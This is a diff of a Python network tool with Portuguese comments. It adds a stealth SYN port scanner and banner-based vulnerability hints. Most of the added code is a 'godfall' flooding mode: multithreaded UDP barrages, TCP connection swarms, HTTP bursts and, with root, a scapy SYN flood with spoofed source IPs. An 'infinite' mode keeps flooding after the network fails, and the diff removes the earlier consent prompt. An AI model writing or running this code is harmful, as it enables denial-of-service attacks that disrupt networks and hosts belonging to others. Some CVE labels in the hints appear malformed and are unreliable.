+    async def _tcp_scan_raw_syn(self, ip: str) -> Optional[List[int]]:
+        """SYN scan stealth via scapy. Half-open: envia SYN, lê SYN/ACK,
+        responde RST. Não loga em syslog do alvo. Roda em executor."""
+        if not HAS_SCAPY:
+            return None
+        loop = asyncio.get_event_loop()
+
+        def _scan_chunk(portas: List[int]) -> List[int]:
+            abertas: List[int] = []
+            try:
+                # sr (multi) com timeout curto; processa em chunks pra evitar memória
+                pkts = [IP(dst=ip)/TCP(dport=p, flags="S",
+                        seq=random.randint(0, 0xFFFFFFFF)) for p in portas]
+                from scapy.all import sr  # import local (já em try-import global)
+                ans, _ = sr(pkts, timeout=2, verbose=False, retry=0)
+                for snd, rcv in ans:
+                    if rcv.haslayer(TCP) and (rcv[TCP].flags & 0x12) == 0x12:  # SYN+ACK
+                        abertas.append(snd[TCP].dport)
+                        # Envia RST para fechar limpo
+                        try:
+                            send(IP(dst=ip)/TCP(dport=snd[TCP].dport,
+                                                flags="R", seq=rcv[TCP].ack),
+                                 verbose=False)
+                        except Exception:
+                            pass
+            except PermissionError:
+                return None  # type: ignore
+            except Exception:
+                pass
+            return abertas
+
+        abertas: List[int] = []
+        # Quebra em chunks de 1024 portas para não estourar memória
+        for i in range(0, len(self.ports), 1024):
+            chunk = self.ports[i:i + 1024]
+            try:
+                res = await loop.run_in_executor(None, _scan_chunk, chunk)
+                if res is None:
+                    return None
+                abertas.extend(res)
+            except Exception:
+                continue
+            # Thermal guard em Termux
+            if ctx_priv and ctx_priv.motor == "root-termux":
+                if temperatura_cpu() >= THERMAL_LIMITE_ABORTAR:
+                    self.ui.error("  Temp crítica — abortando SYN scan.")
+                    break
+        return sorted(set(abertas))
 
     async def _grab_banners(self, ip: str, ports: List[int]) -> Dict[int, Dict]:
         services: Dict[int, Dict] = {}
@@ -863,6 +2715,131 @@ class PortScanner:
             return f"iot/{default}"
         return default
 
+    # ─── Camada de Avaliação de Vulnerabilidades (passivo) ──────
+
+    async def _avaliar_vulns(self, host: Dict[str, Any]) -> List[Dict[str, Any]]:
+        """Para cada porta aberta: cruza com VULN_DB + verificações leves
+        (headers HTTP, versão SSH, banner FTP/Telnet). Sem exploit."""
+        achados: List[Dict[str, Any]] = []
+        ip = host["ip"]
+        servicos = host.get("services", {})
+        for porta in host.get("ports", []):
+            banner = servicos.get(porta, {}).get("banner", "") or ""
+            for assinatura in VULN_DB.get(porta, []):
+                try:
+                    if re.search(assinatura["regex"], banner):
+                        achados.append({
+                            "porta": porta,
+                            "servico": assinatura["servico"],
+                            "dica_cve": assinatura["dica"],
+                            "severidade": assinatura["severidade"],
+                            "verificada": False,
+                        })
+                except re.error:
+                    continue
+            # Checagens dinâmicas
+            if porta in (80, 443, 8080, 8443, 8000, 8888) and HAS_AIOHTTP:
+                achado_h = await self._auditar_headers_http(ip, porta)
+                achados.extend(achado_h)
+            if porta == 22:
+                vss = self._verificar_ssh_versao(banner)
+                if vss:
+                    achados.append(vss)
+            if porta in (21, 23):
+                vbn = self._telnet_ftp_banner(porta, banner)
+                if vbn:
+                    achados.append(vbn)
+        # Dedup por (porta, dica)
+        unicos = []
+        chaves = set()
+        for a in achados:
+            k = (a["porta"], a["dica_cve"])
+            if k in chaves:
+                continue
+            chaves.add(k)
+            unicos.append(a)
+        return unicos
+
+    async def _auditar_headers_http(self, ip: str, porta: int) -> List[Dict[str, Any]]:
+        """Audita ausência de headers de segurança em respostas HTTP."""
+        if not HAS_AIOHTTP:
+            return []
+        esquema = "https" if porta in (443, 8443) else "http"
+        url = f"{esquema}://{ip}:{porta}/"
+        achados: List[Dict[str, Any]] = []
+        cabecalhos_esperados = [
+            "X-Frame-Options", "Content-Security-Policy",
+            "Strict-Transport-Security", "X-Content-Type-Options",
+            "Referrer-Policy",
+        ]
+        try:
+            timeout = aiohttp.ClientTimeout(total=2)
+            conn = aiohttp.TCPConnector(ssl=False, force_close=True)
+            async with aiohttp.ClientSession(timeout=timeout, connector=conn) as ses:
+                async with ses.get(url, ssl=False) as resp:
+                    headers_lower = {k.lower(): v for k, v in resp.headers.items()}
+                    ausentes = [h for h in cabecalhos_esperados if h.lower() not in headers_lower]
+                    if ausentes:
+                        achados.append({
+                            "porta": porta,
+                            "servico": "http",
+                            "dica_cve": "Headers de segurança ausentes: " + ", ".join(ausentes),
+                            "severidade": "media" if len(ausentes) >= 3 else "info",
+                            "verificada": True,
+                        })
+                    # Fingerprint Server header contra versões antigas
+                    server = headers_lower.get("server", "")
+                    if re.search(r"Apache/(1\.|2\.0|2\.2)", server):
+                        achados.append({"porta": porta, "servico": "http",
+                                        "dica_cve": f"Servidor desatualizado: {server}",
+                                        "severidade": "alta", "verificada": True})
+                    elif re.search(r"Microsoft-IIS/[5-7]", server):
+                        achados.append({"porta": porta, "servico": "http",
+                                        "dica_cve": f"IIS legado: {server}",
+                                        "severidade": "alta", "verificada": True})
+                    # Cookies de sessão default
+                    set_cookie = headers_lower.get("set-cookie", "")
+                    if re.search(r"(sessionid=admin|auth=0|admin=true)", set_cookie, re.I):
+                        achados.append({"porta": porta, "servico": "http",
+                                        "dica_cve": "Cookie de sessão suspeito (default/admin)",
+                                        "severidade": "alta", "verificada": True})
+        except Exception:
+            return []
+        return achados
+
+    def _verificar_ssh_versao(self, banner: str) -> Optional[Dict[str, Any]]:
+        m = re.search(r"OpenSSH_(\d+)\.(\d+)", banner)
+        if not m:
+            return None
+        major, minor = int(m.group(1)), int(m.group(2))
+        if (major, minor) < (7, 7):
+            return {"porta": 22, "servico": "ssh",
+                    "dica_cve": f"OpenSSH {major}.{minor} — user enumeration (CVE-2018-15473)",
+                    "severidade": "alta", "verificada": True}
+        if (major, minor) < (8, 5):
+            return {"porta": 22, "servico": "ssh",
+                    "dica_cve": f"OpenSSH {major}.{minor} — múltiplos CVEs corrigidos em 8.5+",
+                    "severidade": "media", "verificada": True}
+        return None
+
+    def _telnet_ftp_banner(self, porta: int, banner: str) -> Optional[Dict[str, Any]]:
+        if not banner:
+            return None
+        if porta == 23:
+            return {"porta": 23, "servico": "telnet",
+                    "dica_cve": f"Telnet exposto (banner: {banner[:60]})",
+                    "severidade": "alta", "verificada": True}
+        if porta == 21:
+            if re.search(r"ProFTPD\s*1\.3\.3c", banner):
+                return {"porta": 21, "servico": "ftp",
+                        "dica_cve": "ProFTPD 1.3.3c backdoor (CVE-2010-15)",
+                        "severidade": "critica", "verificada": True}
+            if re.search(r"vsftpd\s*2\.3\.4", banner):
+                return {"porta": 21, "servico": "ftp",
+                        "dica_cve": "vsftpd 2.3.4 backdoor (CVE-2011-2523)",
+                        "severidade": "critica", "verificada": True}
+        return None
+
     def _print_summary(self, hosts: List[Dict[str, Any]]):
         rows = []
         for h in hosts:
@@ -880,6 +2857,22 @@ class PortScanner:
             self.ui.table("Serviços Detectados",
                            [("Host", C_GREEN), ("Port", C_CYAN),
                             ("Service", C_YELLOW), ("Banner", C_DIM)], rows)
+        # Tabela de vulnerabilidades (modo Insane)
+        if self.insane or self.mode == "insane":
+            vrows = []
+            for h in hosts:
+                for v in h.get("vulns", []) or []:
+                    vrows.append([
+                        h["ip"], str(v.get("porta", "?")),
+                        v.get("servico", "?"),
+                        v.get("severidade", "info").upper(),
+                        v.get("dica_cve", "")[:80],
+                    ])
+            if vrows:
+                self.ui.table("Vulnerabilidades Identificadas (Insane)",
+                               [("Host", C_GREEN), ("Port", C_CYAN),
+                                ("Serviço", C_YELLOW), ("Severidade", C_RED),
+                                ("Dica/CVE", C_WHITE)], vrows)
 
 
 # ══════════════════ STRESS ENGINE ═════════════════════════════
@@ -950,109 +2943,17 @@ class LatencyMonitor:
 
 
 class StressEngine:
-    """Network stress testing — overfull (aggressive) and overflow (iperf3)."""
+    """Stress consolidado: TUDO de DOS vive em --godfall.
+    Helpers internos (TCP flood, UDP storm, HTTP storm, iperf3) são usados
+    como vetores dentro das fases. Modo --infinite ativa TITANFALL eterna."""
 
-    def __init__(self, ui: TerminalUI, detector: NetworkDetector, insane: bool = False):
+    def __init__(self, ui: TerminalUI, detector: NetworkDetector,
+                 insane: bool = False, infinito: bool = False):
         self.ui = ui
         self.det = detector
         self.insane = insane
+        self.infinito = infinito
         self.results: Dict[str, Any] = {}
-
-    async def run_overfull(self):
-        self.ui.section("STRESS TEST — OVERFULL")
-        if not self.ui.consent("Stress pesado pode derrubar a rede. Continuar?"):
-            self.ui.warn("Stress cancelado pelo usuário.")
-            return
-        gw = self.det.gateway
-        if not gw:
-            self.ui.error("Gateway não detectado. Impossível executar stress.")
-            return
-
-        monitor = LatencyMonitor(gw, self.ui)
-        monitor.start()
-        self.ui.info("Monitor de latência iniciado em background")
-
-        try:
-            await self._tcp_flood(gw)
-            await self._udp_storm(gw)
-            await self._http_storm(gw)
-        except KeyboardInterrupt:
-            self.ui.warn("Stress interrompido pelo usuário")
-        finally:
-            lat_stats = monitor.stop()
-            self.results["latency"] = lat_stats
-            self._print_latency_report(lat_stats)
-
-    async def run_flood(self):
-        self.ui.section(f"FLOOD ATTACK — INFINITE packets")
-            
-        gw = self.det.gateway
-        if not gw:
-            gw = self.det.target if self.det.target and self.det.target != "auto" else None
-        
-        if not gw:
-            self.ui.error("Gateway ou alvo não detectado. Impossível executar flood.")
-            return
-            
-        if gw.endswith(".0") or "/" in gw:
-            try:
-                net = ipaddress.ip_network(gw, strict=False)
-                gw = str(next(net.hosts()))
-            except Exception:
-                pass
-
-        self.ui.info(f"Iniciando envio massivo INFINITO (Multi-Thread) de pacotes UDP para {gw}...")
-        self.ui.warn("Pressione Ctrl+C para interromper.")
-        
-        # Variáveis globais para contagem
-        packet_count = [0]
-        
-        def udp_worker():
-            try:
-                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-                payload = os.urandom(65507)  # Payload máximo permitido
-                local_count = 0
-                while True:
-                    try:
-                        sock.sendto(payload, (gw, 80))
-                        sock.sendto(payload, (gw, 53))
-                        sock.sendto(payload, (gw, 443))
-                        sock.sendto(payload, (gw, random.randint(1, 65535)))
-                        local_count += 4
-                        
-                        # Atualiza o contador global a cada 1000 pacotes para não travar
-                        if local_count >= 1000:
-                            packet_count[0] += local_count
-                            local_count = 0
-                    except Exception:
-                        pass
-            except Exception:
-                pass
-
-        start = time.time()
-        
-        threads = []
-        # Inicia 100 threads de flood pesadas
-        for _ in range(100):
-            t = threading.Thread(target=udp_worker, daemon=True)
-            threads.append(t)
-            t.start()
-            
-        try:
-            while True:
-                await asyncio.sleep(1)
-                # printa em tempo real no mesmo lugar da tela
-                print(f"\r  ⚡ [FLOOD] Pacotes enviados: {packet_count[0]:,} ...", end="")
-        except KeyboardInterrupt:
-            print() # pula a linha pra nao cortar o print anterior
-            self.ui.warn("Interrompido pelo usuário.")
-        except asyncio.CancelledError:
-            print()
-            self.ui.warn("Tarefa cancelada.")
-            
-        elapsed = time.time() - start
-        
-        self.ui.success(f"Flood interrompido. Tempo de ataque: {elapsed:.2f}s | Total de Pacotes: {packet_count[0]:,}")
 
     async def _tcp_flood(self, target: str):
         self.ui.info("TCP Connection Flood iniciando...")
@@ -1141,28 +3042,6 @@ class StressEngine:
             await resp.read()
             return resp.status
 
-    async def run_overflow(self):
-        self.ui.section("STRESS TEST — OVERFLOW (iperf3)")
-        if not shutil.which("iperf3"):
-            self.ui.error("iperf3 não encontrado. Instale: pkg install iperf3")
-            return
-        gw = self.det.gateway
-        if not gw:
-            self.ui.error("Gateway não detectado.")
-            return
-
-        monitor = LatencyMonitor(gw, self.ui)
-        monitor.start()
-        try:
-            self.ui.info("iperf3 TCP test...")
-            await self._run_iperf(gw, False)
-            self.ui.info("iperf3 UDP test...")
-            await self._run_iperf(gw, True)
-        finally:
-            lat_stats = monitor.stop()
-            self.results["latency"] = lat_stats
-            self._print_latency_report(lat_stats)
-
     async def _run_iperf(self, target: str, udp: bool):
         cmd = ["iperf3", "-c", target, "-t", "10", "-J"]
         if udp:
@@ -1193,6 +3072,466 @@ class StressEngine:
         except FileNotFoundError:
             self.ui.error("  iperf3 não disponível no servidor remoto")
 
+    async def run_godfall(self, hosts: List[Dict[str, Any]]):
+        rotulo = "GODFALL ETERNAL — TITAN APEX (modo INFINITO)" if self.infinito \
+                 else "GODFALL - TITAN RESILIENCE SWEEP"
+        self.ui.section(rotulo)
+        # Sem prompt interativo — uso é responsabilidade do operador.
+        # Consulte o README seção "⚠ AVISO LEGAL --godfall" antes de usar.
+        if self.infinito:
+            self.ui.error("⚠ MODO INFINITO ATIVO — sem freios automáticos.")
+            self.ui.error("⚠ Pressione Ctrl+C para encerrar quando desejar.")
+        else:
+            self.ui.warn("Teste intenso, porém controlado. Freios automáticos "
+                         "(latência/loss/sucesso) ATIVOS — abortam se a rede ceder.")
+
+        if not hosts:
+            self.ui.warn("Nenhum host para testar no Godfall.")
+            return
+
+        monitor = None
+        if self.det.gateway:
+            monitor = LatencyMonitor(self.det.gateway, self.ui)
+            monitor.start()
+            self.ui.info("Monitor de latência em background iniciado.")
+
+        # Baseline iperf3 (RECON) — absorvido do antigo --overflow
+        baseline_iperf: Dict[str, Any] = {}
+        if shutil.which("iperf3") and self.det.gateway:
+            self.ui.info("RECON: baseline iperf3 (TCP+UDP) — pode levar até 30s...")
+            try:
+                await self._run_iperf(self.det.gateway, False)
+                baseline_iperf["tcp"] = self.results.get("iperf_tcp", {})
+                await self._run_iperf(self.det.gateway, True)
+                baseline_iperf["udp"] = self.results.get("iperf_udp", {})
+            except Exception:
+                self.ui.warn("Baseline iperf3 falhou — seguindo sem ele.")
+
+        base_attempts = GODFALL_ATTEMPTS_INSANE if self.insane else GODFALL_ATTEMPTS
+        # Fases apex sob --root: tiers e concorrência elevados
+        if priv_ativo():
+            phases = list(GODFALL_PHASES_ROOT_INSANE if self.insane else GODFALL_PHASES_ROOT)
+            base_attempts = int(base_attempts * 1.6)  # mais tentativas/host com root
+            self.ui.warn(f"  [ROOT] Fases APEX carregadas — multipliers até "
+                         f"{phases[-1]['multiplier']}x, conc. até {phases[-1]['concurrency']}.")
+        else:
+            phases = list(GODFALL_PHASES_INSANE if self.insane else GODFALL_PHASES)
+        # Filtra o próprio IP local — não faz sentido atacar a si mesmo
+        # (gasta CPU/banda e piora a lentidão de quem está rodando o godfall)
+        meu_ip = getattr(self.det, "local_ip", "")
+        hosts_filtrados = [h for h in hosts if h.get("ip") != meu_ip]
+        if meu_ip and len(hosts_filtrados) < len(hosts):
+            self.ui.info(f"Excluindo seu próprio IP ({meu_ip}) da lista de alvos.")
+        prioritized_hosts = sorted(hosts_filtrados,
+                                    key=lambda h: (not h.get("is_gateway", False), h["ip"]))
+        per_host: Dict[str, Dict[str, Any]] = {}
+        phase_results: List[Dict[str, Any]] = []
+        aborted = False
+        abort_reason = ""
+
+        async def tcp_burst(ip: str, port: int, timeout_s: float) -> bool:
+            try:
+                _, w = await asyncio.wait_for(asyncio.open_connection(ip, port), timeout=timeout_s)
+                w.close()
+                await w.wait_closed()
+                return True
+            except Exception:
+                return False
+
+        async def http_burst(session: Optional["aiohttp.ClientSession"], ip: str, port: int, method: str) -> bool:
+            if not HAS_AIOHTTP:
+                return await tcp_burst(ip, port, 1.2)
+            scheme = "https" if port in (443, 8443) else "http"
+            url = f"{scheme}://{ip}:{port}/"
+            try:
+                if session is None:
+                    timeout = aiohttp.ClientTimeout(total=2)
+                    connector = aiohttp.TCPConnector(limit=1, ssl=False, force_close=True)
+                    async with aiohttp.ClientSession(timeout=timeout, connector=connector) as temp:
+                        async with temp.request(method, url, ssl=False) as resp:
+                            await resp.read()
+                            return resp.status < 500
+                async with session.request(method, url, ssl=False) as resp:
+                    await resp.read()
+                    return resp.status < 500
+            except Exception:
+                return False
+
+        async def run_attempt(session: Optional["aiohttp.ClientSession"], ip: str, ports: List[int]) -> Tuple[bool, str]:
+            web_ports = [p for p in ports if p in (80, 443, 8080, 8443, 8000, 8081, 8888)]
+            infra_ports = [p for p in ports if p in (22, 53, 445, 554)]
+            if web_ports:
+                chosen = random.choice(web_ports)
+                mode = random.choice(["HEAD", "GET", "TCP"])
+                if mode == "HEAD":
+                    return await http_burst(session, ip, chosen, "HEAD"), "http-head"
+                if mode == "GET":
+                    return await http_burst(session, ip, chosen, "GET"), "http-get"
+                return await tcp_burst(ip, chosen, 1.2), "tcp-connect"
+            if infra_ports:
+                chosen = random.choice(infra_ports)
+                return await tcp_burst(ip, chosen, 1.2), "tcp-connect"
+            chosen = random.choice(ports or [80])
+            return await tcp_burst(ip, chosen, 1.2), "tcp-connect"
+
+        def _lat_window_stats(sample_window: int = 20) -> Tuple[float, float]:
+            if not monitor or not getattr(monitor, "samples", None):
+                return 0.0, 0.0
+            window = monitor.samples[-sample_window:]
+            total = len(window)
+            if total == 0:
+                return 0.0, 0.0
+            lost = sum(1 for _, lat in window if lat < 0)
+            valid = [lat for _, lat in window if lat >= 0]
+            avg = (sum(valid) / len(valid)) if valid else 0.0
+            loss = (lost / total) * 100.0
+            return avg, loss
+
+        def _detectar_degradacao(phase_success_pct: float) -> Tuple[bool, str]:
+            """Detecta se algum dos limites de degradação foi cruzado.
+            Retorna (degradado, motivo). Independente do modo infinito."""
+            if not monitor:
+                return False, ""
+            if monitor.baseline <= 0:
+                return False, ""
+            avg_lat, loss_pct = _lat_window_stats()
+            if loss_pct >= GODFALL_ABORT_LOSS_PCT:
+                return True, f"packet_loss {loss_pct:.1f}% >= {GODFALL_ABORT_LOSS_PCT}%"
+            if avg_lat and avg_lat >= (monitor.baseline * GODFALL_ABORT_LATENCY_MULT):
+                return True, f"latency {avg_lat:.1f}ms >= {GODFALL_ABORT_LATENCY_MULT}x baseline"
+            if phase_success_pct <= GODFALL_ABORT_SUCCESS_PCT:
+                return True, f"success {phase_success_pct:.1f}% <= {GODFALL_ABORT_SUCCESS_PCT}%"
+            return False, ""
+
+        def _should_abort(phase_success_pct: float) -> Tuple[bool, str]:
+            """Aplica freios. No modo --infinite, NUNCA aborta — apenas
+            anuncia 'rede caiu' e segue mandando pacotes até Ctrl+C."""
+            degradado, motivo = _detectar_degradacao(phase_success_pct)
+            if not degradado:
+                return False, ""
+            if self.infinito:
+                # Sem freios — só sinaliza que a rede já caiu
+                self.ui.error(f"  🚨 REDE CAIU ({motivo}) — STILL FLOODING (Ctrl+C para parar)")
+                return False, motivo
+            return True, motivo
+
+        barrage_pkt_counter = [0]
+
+        def _spawn_barrage(targets: List[str], tier: int, stop_event: threading.Event) -> List[threading.Thread]:
+            if tier <= 0 or not targets:
+                return []
+            payload_big = os.urandom(65507)
+            payload_mid = os.urandom(4096)
+            payload_small = os.urandom(512)
+            payloads = [payload_big, payload_mid, payload_small]
+            ports = GODFALL_BARRAGE_PORTS
+            threads: List[threading.Thread] = []
+
+            def udp_worker():
+                try:
+                    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+                    try:
+                        sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
+                    except Exception:
+                        pass
+                    local = 0
+                    while not stop_event.is_set():
+                        try:
+                            tgt = random.choice(targets)
+                            pl = random.choice(payloads)
+                            sock.sendto(pl, (tgt, random.choice(ports)))
+                            sock.sendto(pl, (tgt, random.randint(1, 65535)))
+                            local += 2
+                            if local >= 512:
+                                barrage_pkt_counter[0] += local
+                                local = 0
+                        except Exception:
+                            pass
+                except Exception:
+                    pass
+
+            def tcp_swarm():
+                while not stop_event.is_set():
+                    try:
+                        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                        s.settimeout(0.6)
+                        try:
+                            s.connect((random.choice(targets), random.choice([80, 443, 8080, 22])))
+                        except Exception:
+                            pass
+                        finally:
+                            try:
+                                s.close()
+                            except Exception:
+                                pass
+                    except Exception:
+                        pass
+
+            for _ in range(GODFALL_BARRAGE_THREADS_PER_TIER * tier):
+                t = threading.Thread(target=udp_worker, daemon=True)
+                t.start()
+                threads.append(t)
+            for _ in range(GODFALL_TCP_SWARM_PER_TIER * tier):
+                t = threading.Thread(target=tcp_swarm, daemon=True)
+                t.start()
+                threads.append(t)
+            return threads
+
+        async def run_host_phase(host: Dict[str, Any], phase: Dict[str, Any], sem: asyncio.Semaphore,
+                                 session: Optional["aiohttp.ClientSession"]) -> Dict[str, Any]:
+            ip = host["ip"]
+            ports = host.get("ports", [])
+            target_ports = [p for p in ports if p in (80, 443, 8080, 8443, 22, 53, 445, 554, 8000, 8081, 8888)] or [80]
+            attempts = max(16, int(base_attempts * phase["multiplier"]))
+            op_counts = defaultdict(int)
+            start = time.time()
+
+            async def one_attempt() -> Tuple[bool, str]:
+                async with sem:
+                    res = await run_attempt(session, ip, target_ports)
+                    if phase["delay"] > 0:
+                        await asyncio.sleep(phase["delay"])
+                    return res
+
+            outcomes = await asyncio.gather(*[one_attempt() for _ in range(attempts)],
+                                            return_exceptions=True)
+            success = 0
+            fail = 0
+            for r in outcomes:
+                if isinstance(r, Exception) or not isinstance(r, tuple):
+                    fail += 1
+                    op_counts["error"] += 1
+                    continue
+                ok, op_name = r
+                op_counts[op_name] += 1
+                if ok:
+                    success += 1
+                else:
+                    fail += 1
+            elapsed = max(time.time() - start, 0.001)
+            slot = per_host.setdefault(ip, {
+                "ip": ip,
+                "attempts": 0,
+                "success": 0,
+                "fail": 0,
+                "avg_rps": 0.0,
+                "phase_scores": [],
+                "operation_mix": defaultdict(int),
+            })
+            slot["attempts"] += attempts
+            slot["success"] += success
+            slot["fail"] += fail
+            slot["avg_rps"] += attempts / elapsed
+            slot["phase_scores"].append({
+                "name": phase["name"],
+                "success_rate": round((success / attempts) * 100, 1),
+                "avg_rps": round(attempts / elapsed, 2),
+            })
+            for name, count in op_counts.items():
+                slot["operation_mix"][name] += count
+            return {"ip": ip, "attempts": attempts, "success": success, "fail": fail, "elapsed_s": elapsed}
+
+        self.ui.info(f"Executando sweep em {len(prioritized_hosts)} hosts...")
+        target_ips = [h["ip"] for h in prioritized_hosts]
+        for phase in phases:
+            if aborted:
+                break
+            phase_attempts = max(16, int(base_attempts * phase["multiplier"]))
+            tier = int(phase.get("barrage", 0))
+            self.ui.info(f"Fase {phase['name']}: {phase_attempts} tentativas/host | "
+                         f"concorrencia {phase['concurrency']} | barrage tier {tier}")
+            phase_sem = asyncio.Semaphore(phase["concurrency"])
+            session = None
+            if HAS_AIOHTTP:
+                timeout = aiohttp.ClientTimeout(total=2)
+                connector = aiohttp.TCPConnector(limit=phase["concurrency"], ssl=False, force_close=True)
+                session = aiohttp.ClientSession(timeout=timeout, connector=connector)
+            barrage_stop = threading.Event()
+            pkt_before = barrage_pkt_counter[0]
+            barrage_threads = _spawn_barrage(target_ips, tier, barrage_stop)
+            if barrage_threads:
+                self.ui.warn(f"  ⚡ BARRAGE armado: {len(barrage_threads)} threads (UDP+TCP)")
+            # ─── Boost --root: SYN flood raw spoofed adicional ───
+            raw_flood_threads: List[threading.Thread] = []
+            raw_pkt_counter = [0]
+            if priv_ativo() and tem_cap("scapy") and tier >= 2:
+                raw_flood_threads = self._spawn_titan_flood_raw(
+                    target_ips, tier, barrage_stop, raw_pkt_counter)
+                if raw_flood_threads:
+                    self.ui.warn(f"  ⚡ ROOT SYN FLOOD: {len(raw_flood_threads)} threads "
+                                 f"raw scapy (IPs source spoofed)")
+            try:
+                if self.infinito and phase["name"] == "TITANFALL":
+                    self.ui.warn("  ⚠ TITANFALL ETERNAL ATIVA — Ctrl+C para encerrar.")
+                    host_results: List[Dict[str, Any]] = []
+                    ciclo_n = 0
+                    rede_ja_caiu = False
+                    try:
+                        while True:
+                            ciclo_n += 1
+                            ciclo = await asyncio.gather(
+                                *[run_host_phase(h, phase, phase_sem, session)
+                                  for h in prioritized_hosts])
+                            host_results = ciclo
+                            # Calcula sucesso do ciclo só pra alimentar o detector
+                            tot_a = sum(r["attempts"] for r in host_results)
+                            tot_s = sum(r["success"] for r in host_results)
+                            ciclo_pct = (tot_s / tot_a * 100.0) if tot_a else 0.0
+                            # Detecta degradação SEM abortar (modo infinito)
+                            degr, motivo = _detectar_degradacao(ciclo_pct)
+                            if degr and not rede_ja_caiu:
+                                print()  # quebra a linha do contador
+                                self.ui.error(f"  🚨 REDE CAIU ({motivo}) — "
+                                              f"STILL FLOODING. Ctrl+C para parar.")
+                                rede_ja_caiu = True
+                            elif not degr and rede_ja_caiu:
+                                print()
+                                self.ui.success(f"  ✓ Rede recuperou — "
+                                                f"flooding continua.")
+                                rede_ja_caiu = False
+                            tag = "💀" if rede_ja_caiu else "⚡"
+                            print(f"\r  {tag} [TITANFALL ETERNAL] ciclo {ciclo_n} | "
+                                  f"pacotes barrage: {barrage_pkt_counter[0]:,} | "
+                                  f"sucesso ciclo: {ciclo_pct:.0f}%", end="")
+                    except (KeyboardInterrupt, asyncio.CancelledError):
+                        print()
+                        self.ui.warn("TITANFALL ETERNAL interrompida pelo usuário.")
+                else:
+                    host_results = await asyncio.gather(
+                        *[run_host_phase(h, phase, phase_sem, session)
+                          for h in prioritized_hosts])
+            finally:
+                barrage_stop.set()
+                if session is not None:
+                    try:
+                        await session.close()
+                    except Exception:
+                        pass
+            phase_packets = barrage_pkt_counter[0] - pkt_before
+            if barrage_threads:
+                self.ui.success(f"  ⚡ BARRAGE finalizada: {phase_packets:,} pacotes UDP disparados")
+
+            total_attempts = sum(r["attempts"] for r in host_results)
+            total_success = sum(r["success"] for r in host_results)
+            phase_success_pct = round((total_success / total_attempts) * 100, 1) if total_attempts else 0.0
+
+            lat_snapshot = None
+            if monitor and monitor.samples:
+                valid = [s[1] for s in monitor.samples[-10:] if s[1] >= 0]
+                if valid:
+                    lat_snapshot = round(sum(valid) / len(valid), 2)
+            phase_results.append({
+                "name": phase["name"],
+                "attempts_per_host": phase_attempts,
+                "concurrency": phase["concurrency"],
+                "delay_ms": int(phase["delay"] * 1000),
+                "latency_snapshot_ms": lat_snapshot if lat_snapshot is not None else 0,
+                "success_rate_pct": phase_success_pct,
+                "barrage_tier": tier,
+                "barrage_packets": phase_packets,
+            })
+
+            do_abort, why = _should_abort(phase_success_pct)
+            if do_abort:
+                aborted = True
+                abort_reason = f"{phase['name']}: {why}"
+                self.ui.warn(f"ABORT: {abort_reason}")
+
+        per_host_rows = []
+        for ip, data in per_host.items():
+            attempts = max(data["attempts"], 1)
+            per_host_rows.append({
+                "ip": ip,
+                "attempts": data["attempts"],
+                "success": data["success"],
+                "fail": data["fail"],
+                "success_rate": round((data["success"] / attempts) * 100, 1),
+                "avg_rps": round(data["avg_rps"] / max(len(phases), 1), 2),
+                "phase_scores": data["phase_scores"],
+                "operation_mix": dict(data["operation_mix"]),
+            })
+
+        recovery = {"recovered": False, "seconds": 0.0}
+        if monitor:
+            # Recovery window: wait until latency gets close to baseline for N consecutive samples.
+            if monitor.baseline > 0:
+                stable = 0
+                start_recovery = time.time()
+                while time.time() - start_recovery < GODFALL_RECOVERY_TIMEOUT_S:
+                    await asyncio.sleep(0.5)
+                    avg_lat, loss_pct = _lat_window_stats(sample_window=12)
+                    if loss_pct <= 20.0 and avg_lat and avg_lat <= (monitor.baseline * GODFALL_RECOVERY_TARGET_MULT):
+                        stable += 1
+                    else:
+                        stable = 0
+                    if stable >= GODFALL_RECOVERY_STABLE_SAMPLES:
+                        recovery["recovered"] = True
+                        recovery["seconds"] = round(time.time() - start_recovery, 2)
+                        break
+            lat_stats = monitor.stop()
+            self.results["latency"] = lat_stats
+            self._print_latency_report(lat_stats)
+
+        avg_success = round(sum(h["success_rate"] for h in per_host_rows) / len(per_host_rows), 1) if per_host_rows else 0.0
+        self.results["godfall"] = {
+            "hosts_tested": len(per_host_rows),
+            "attempts_per_host": base_attempts,
+            "avg_success_rate": avg_success,
+            "phases": phase_results,
+            "per_host": sorted(per_host_rows, key=lambda x: x["success_rate"]),
+            "aborted": aborted,
+            "abort_reason": abort_reason,
+            "recovery": recovery,
+            "barrage_packets_total": barrage_pkt_counter[0],
+            "modo": "infinito" if self.infinito else "fases",
+            "baseline_iperf": baseline_iperf,
+        }
+
+        rows = [[h["ip"], str(h["attempts"]), f"{h['success_rate']}%", f"{h['avg_rps']}"]
+                for h in sorted(per_host_rows, key=lambda x: x["success_rate"])[:20]]
+        self.ui.table("Godfall Titan Sweep (Top 20 piores)",
+                      [("IP", C_CYAN), ("Attempts", C_WHITE), ("Success", C_YELLOW), ("Req/s", C_GREEN)],
+                      rows)
+
+    def _spawn_titan_flood_raw(self, alvos: List[str], tier: int,
+                                stop_event: threading.Event,
+                                contador: List[int]) -> List[threading.Thread]:
+        """SYN flood raw via scapy com IPs source aleatórios. Threads
+        mantêm-se rodando até stop_event.set(). Retorna lista de threads."""
+        if not HAS_SCAPY or not alvos:
+            return []
+        threads: List[threading.Thread] = []
+        n_threads = max(4, tier * 4)  # 8 a 24 threads conforme tier
+
+        def _worker():
+            local = 0
+            try:
+                from scapy.all import IP as _IP, TCP as _TCP, send as _send
+            except Exception:
+                return
+            while not stop_event.is_set():
+                try:
+                    alvo = random.choice(alvos)
+                    src = ".".join(str(random.randint(1, 254)) for _ in range(4))
+                    porta = random.choice([80, 443, 22, 8080, 21, 25, 3389])
+                    pkt = _IP(src=src, dst=alvo)/_TCP(
+                        sport=random.randint(1024, 65535),
+                        dport=porta, flags="S",
+                        seq=random.randint(0, 0xFFFFFFFF))
+                    _send(pkt, verbose=False)
+                    local += 1
+                    if local >= 64:
+                        contador[0] += local
+                        local = 0
+                except Exception:
+                    pass
+
+        for _ in range(n_threads):
+            t = threading.Thread(target=_worker, daemon=True)
+            t.start()
+            threads.append(t)
+        return threads
+
     def _print_latency_report(self, stats: Dict):
         rows = [
             ["Baseline", f"{stats['baseline_ms']}ms"],
@@ -1206,10 +3545,2946 @@ class StressEngine:
                        [("Métrica", C_CYAN), ("Valor", C_GREEN)], rows)
 
 
